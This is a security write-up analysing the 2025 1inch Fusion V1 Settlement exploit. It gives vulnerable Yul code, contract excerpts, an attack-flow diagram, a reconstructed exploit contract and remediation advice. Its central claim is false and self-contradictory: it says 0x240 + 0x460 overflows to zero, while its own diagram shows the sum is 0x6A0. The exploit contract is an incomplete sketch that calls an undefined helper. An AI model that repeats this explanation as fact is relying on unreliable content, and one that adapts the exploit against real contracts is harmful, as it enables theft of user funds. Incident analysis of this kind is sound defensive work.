# 1inch Fusion V1 — Yul Calldata Corruption Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2025-03-10 |
| **Protocol** | 1inch Fusion V1 Settlement |
| **Chain** | Ethereum |
| **Loss** | ~$4,500,000 |
| **Attacker** | [0xA7264a43...](https://etherscan.io/address/0xA7264a43A57Ca17012148c46AdBc15a5F951766e) |
| **Attack Tx** | [Unconfirmed](https://etherscan.io) |
| **Vulnerable Contract** | [0xa888000...](https://etherscan.io/address/0xa88800cd213da5ae406ce248380802bd53b47647) (Settlement) |
| **Root Cause** | In the `_settleOrder()` function implemented in Yul assembly, an `interactionLength + suffixLength` overflow corrupts the calldata pointer, enabling arbitrary memory writes |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-03/OneInchFusionV1SettlementHack.sol_exp.sol) |

---

## 1. Vulnerability Overview

The 1inch Fusion V1 Settlement contract contained an integer overflow vulnerability in the `_settleOrder()` function implemented in Yul (inline assembly), triggered during the summation of `interactionLength` and `suffixLength`. The attacker manipulated both values so that `add(interactionLength, suffixLength) == 0` (setting them to 0x240 and 0x460 respectively), and used 544 bytes of padding data combined with nested order interactions to cause the settlement contract to write attacker-controlled data into memory. This allowed the attacker to bypass signature verification and transfer victims' USDC and USDT to the attacker's address.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable Yul code (expressed as pseudocode)
// Yul assembly inside _settleOrder

function _settleOrder(bytes calldata orderData) internal {
    assembly {
        let interactionLength := calldataload(interactionLengthOffset)
        let suffixLength := calldataload(suffixLengthOffset)

        // ❌ Overflow possible: if the sum of the two values exceeds 2^256 it wraps to 0
        // Exploited via the add(interactionLength, suffixLength) == 0 condition
        let totalLength := add(interactionLength, suffixLength)

        // If totalLength is 0, a pointer calculation error occurs
        // Attacker can write data to an arbitrary location
        let dataPtr := add(orderData.offset, totalLength)
        // dataPtr points to a manipulated location → arbitrary memory corruption
        calldatacopy(dataPtr, ...)
    }
}

// ✅ Safe code: includes overflow check
function _settleOrder(bytes calldata orderData) internal {
    assembly {
        let interactionLength := calldataload(interactionLengthOffset)
        let suffixLength := calldataload(suffixLengthOffset)

        // Overflow check
        let totalLength := add(interactionLength, suffixLength)
        if lt(totalLength, interactionLength) {
            revert(0, 0) // Revert on overflow detection
        }
        // Bounds check
        if gt(totalLength, calldatasize()) {
            revert(0, 0) // Prevent out-of-bounds access
        }
    }
}
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: contracts/Settlement.sol
function settleOrders(bytes calldata data) external {
        _settleOrder(data, msg.sender, 0, new bytes(0));
    }
    function fillOrderInteraction(
        address taker,
        uint256, /* makingAmount */
        uint256 takingAmount,
        bytes calldata interactiveData
    ) external onlyThis(taker) onlyLimitOrderProtocol returns (uint256 result) {
        (DynamicSuffix.Data calldata suffix, bytes calldata tokensAndAmounts, bytes calldata interaction) = interactiveData.decodeSuffix();
        IERC20 token = IERC20(suffix.token.get());
        result = takingAmount * (_BASE_POINTS + suffix.rateBump) / _BASE_POINTS;
        uint256 takingFee = result * suffix.takingFee.ratio() / TakingFee._TAKING_FEE_BASE;

        bytes memory allTokensAndAmounts = new bytes(tokensAndAmounts.length + 0x40);
        assembly {
            let ptr := add(allTokensAndAmounts, 0x20)
            calldatacopy(ptr, tokensAndAmounts.offset, tokensAndAmounts.length)
            ptr := add(ptr, tokensAndAmounts.length)
            mstore(ptr, token)
            mstore(add(ptr, 0x20), add(result, takingFee))
        }

        if (interactiveData[0] == _FINALIZE_INTERACTION) {
            _chargeFee(suffix.resolver.get(), suffix.totalFee);
            address target = address(bytes20(interaction));
            bytes calldata data = interaction[20:];
            IResolver(target).resolveOrders(suffix.resolver.get(), allTokensAndAmounts, data);
        } else {
            _settleOrder(
                interaction,
                suffix.resolver.get(),
                suffix.totalFee,
                allTokensAndAmounts
            );
        }

        if (takingFee > 0) {
            token.safeTransfer(suffix.takingFee.receiver(), takingFee);
        }
        token.forceApprove(address(_limitOrderProtocol), result);
    }

// ... (lines 94-111 omitted) ...

            function memcpy(dst, src, len) {
                pop(staticcall(gas(), 0x4, src, len, dst, len))
            }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Construct manipulated order data
  │         ├─ interactionLength: 0x240 (576)
  │         ├─ suffixLength: 0x460 (1120)
  │         └─ Sum: 0x240 + 0x460 = 0x6A0... overflow → 0!
  │
  ├─→ [2] Insert 544-byte padding data
  │         └─ Place attacker-controlled data at a specific offset
  │
  ├─→ [3] Re-invoke settlement contract via nested order interaction
  │         └─ Accumulate controlled data via self-referential ping-pong
  │
  ├─→ [4] Bypass signature verification
  │         └─ Impersonate an arbitrary address as signer via corrupted calldata
  │
  ├─→ [5] Drain USDC/USDT from victim (TrustedVolumes: 0xB02F39e3)
  │         └─ ~1M USDC per transaction
  │            Target address: 0xBbb587E59251D219a7a05Ce989ec1969C01522C0
  │
  └─→ [6] Total ~$4,500,000 drained
```

## 4. PoC Code (Core Logic + Comments)

```solidity
// Full PoC not available — reconstructed from summary
// The actual attack involved highly sophisticated calldata manipulation

contract OneInchFusionAttacker {
    address constant SETTLEMENT = 0xa88800cd213da5ae406ce248380802bd53b47647;
    address constant VICTIM = 0xB02F39e382c90160Eb816DE5e0E428ac771d77B5;

    function attack() external {
        // [1] Construct specially crafted order calldata to trigger overflow
        // interactionLength(0x240) + suffixLength(0x460) = overflow → 0
        bytes memory maliciousOrderData = _craftMaliciousOrder();

        // [2] Submit manipulated order to the settlement contract
        // → Yul overflow occurs inside _settleOrder
        // → Signature verification bypassed
        // → Victim USDC drained
        ISettlement(SETTLEMENT).settleOrders(maliciousOrderData);
    }

    function _craftMaliciousOrder() internal view returns (bytes memory) {
        // interactionLength: 0x240 (offset for bypassing signature verification)
        // suffixLength: 0x460 (value to trigger overflow)
        // padding: 544 bytes of controlled data
        // nested interaction: settlement self-re-invocation ping-pong
        // goal: execute USDC.transfer(attacker, victimBalance)
        return abi.encodePacked(
            uint256(0x240),    // interactionLength
            uint256(0x460),    // suffixLength (triggers overflow)
            new bytes(544),    // padding
            _buildNestedInteraction() // nested order interaction
        );
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Calldata corruption via Yul integer overflow |
| **CWE** | CWE-190: Integer Overflow / Wrapping |
| **Attack Vector** | External (injected manipulated order calldata) |
| **DApp Category** | DEX Aggregator / Limit Order |
| **Impact** | ~$4,500,000 USDC/USDT drained |

## 6. Remediation Recommendations

1. **Safe arithmetic checks in Yul**: Add overflow detection logic after every `add`/`mul` operation
2. **Calldata bounds validation**: Verify that all computed pointers remain within valid calldata bounds
3. **Prefer high-level Solidity**: Minimize Yul usage and leverage the built-in overflow protection of Solidity 0.8+
4. **Fuzz testing for manipulated calldata**: Perform comprehensive fuzz testing covering boundary values (maximum values, overflow-triggering values)

## 7. Lessons Learned

- Yul (inline assembly) is a powerful optimization tool, but it is highly dangerous because Solidity's built-in protections (overflow checks, bounds checks, etc.) do not apply.
- Calldata pointer manipulation via integer overflow can lead to arbitrary memory writes, enabling a wide range of attacks including signature verification bypass.
- Complex assembly code is difficult to guarantee safe without formal verification or a specialist Yul audit.